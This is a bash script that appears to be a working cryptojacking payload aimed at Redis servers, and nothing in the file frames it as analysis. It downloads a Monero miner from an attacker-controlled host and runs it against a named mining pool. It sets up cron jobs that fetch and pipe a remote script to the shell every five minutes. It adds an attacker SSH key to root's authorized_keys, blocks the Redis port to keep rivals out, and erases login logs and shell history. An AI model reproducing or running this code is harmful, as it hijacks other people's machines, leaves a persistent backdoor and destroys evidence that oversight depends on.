#!/bin/bash
if [ ! -f "/tmp/rediservice" ];then
wget http://igot.verymad.net/cgi-bin/minerd --no-check-certificate -O /tmp/rediservice && chmod +x /tmp/rediservice
wget http://igot.verymad.net/cgi-bin/libgcc.so --no-check-certificate -O /tmp/lptables && chmod +x /tmp/lptables
fi
cd /tmp
PS1=$(ps aux | grep lptables | grep -v "grep" | wc -l)
if [ $PS1 -eq 0 ];
then
    /tmp/lptables -B -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u litecoin@420blaze.it -p x &
fi
PS3=$(strings /lib64/libc.so.6 |grep GLIBC_2.14 | wc -l)
if [[ $PS3 -eq 0 && -e /etc/redhat-release && ! -e /opt/glibc-2.14/lib/libc.so.6 ]];
then
wget http://igot.verymad.net/cgi-bin/glibc-2.14.tar.gz -O /tmp/glibc-2.14.tar.gz && tar zxvf /tmp/glibc-2.14.tar.gz -C / && export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH && /tmp/rediservice -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u litecoin@420blaze.it -p x -B && echo "" > /var/log/wtmp && echo "" > /var/log/secure && history -c 
fi
PS2=$(ps aux | grep rediservice | grep -v "grep" | wc -l)
if [ $PS2 -eq 0 ];
then
    export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH
    /tmp/rediservice -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u litecoin@420blaze.it -p x -B
fi
echo "*/5 * * * * curl -fsSL http://igot.verymad.net/cgi-bin/javautil.sh | sh" > /var/spool/cron/rediservice
echo "*/5 * * * * wget -q -O- http://igot.verymad.net/cgi-bin/javautil.sh | sh" >> /var/spool/cron/rediservice
mkdir -p /var/spool/cron/crontabs
mkdir -p /root/.ssh/
echo "*/5 * * * * curl -fsSL http://igot.verymad.net/cgi-bin/javautil.sh | sh" > /var/spool/cron/crontabs/rediservice
echo "*/5 * * * * wget -q -O- http://igot.verymad.net/cgi-bin/javautil.sh | sh" >> /var/spool/cron/crontabs/rediservice
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbLzCLvYFxn0tjNpBakQ/wCFqPADS4ehb9zZBua64SnKm2p1lpAmHI7ID+dtmHs2y+JluhvMsRga/clIIR5c04tlhzlrTz59NzEmsQdb+TaMugoBefHbTTmGOtxNEN07GmEZlpvJIgcD78Ggnma28oeKZeUUvntOg4IE7zgg0BWjtcxQz4k3GmkGDdy7nlwR8mFSnSYAORQku0mcYP2MwmJaRdWDxk2B1rAe8GYrpXxd2a1Q9dhPRwlXRuqQ9bDHVUZHj+Q1y6Kh9K87ccSFIRKiQvhzKupxKpjSCHQKgrzlBhvlKy1aGc7d6N5ui8eUsM8vhICsH7VkJjtRq/T85L javautil" >> /root/.ssh/authorized_keys
PS3=$(iptables -L | grep 6379 | wc -l)
if [ $PS3 -eq 0 ];
then
yum -y install iptables-services
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
service iptables save
/etc/init.d/iptables-persistent save
fi
echo "" > /var/log/wtmp
echo "" > /var/log/secure
history -c